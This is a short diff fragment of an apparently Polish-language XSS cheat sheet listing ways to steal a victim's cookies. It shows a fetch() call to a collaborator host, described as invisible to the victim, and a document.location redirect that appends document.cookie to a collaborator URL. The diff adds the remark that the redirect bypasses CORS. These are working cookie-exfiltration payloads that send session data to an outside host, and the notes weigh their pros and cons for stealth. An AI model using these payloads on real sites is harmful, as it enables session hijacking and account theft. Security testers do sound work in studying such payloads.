@@ -9,7 +9,7 @@ javascriptfetch('https://collaborator.com', {
 })
 ✅ Nowoczesna, czysta, nie widoczna dla ofiary
 
-2. location (redirect)
+2. location (redirect)  -> omija cors
 javascriptdocument.location='https://collaborator.com/?c='+document.cookie
 ✅ Prosta, działa wszędzie
 ❌ Przekierowuje ofiarę – widzi że coś się dzieje
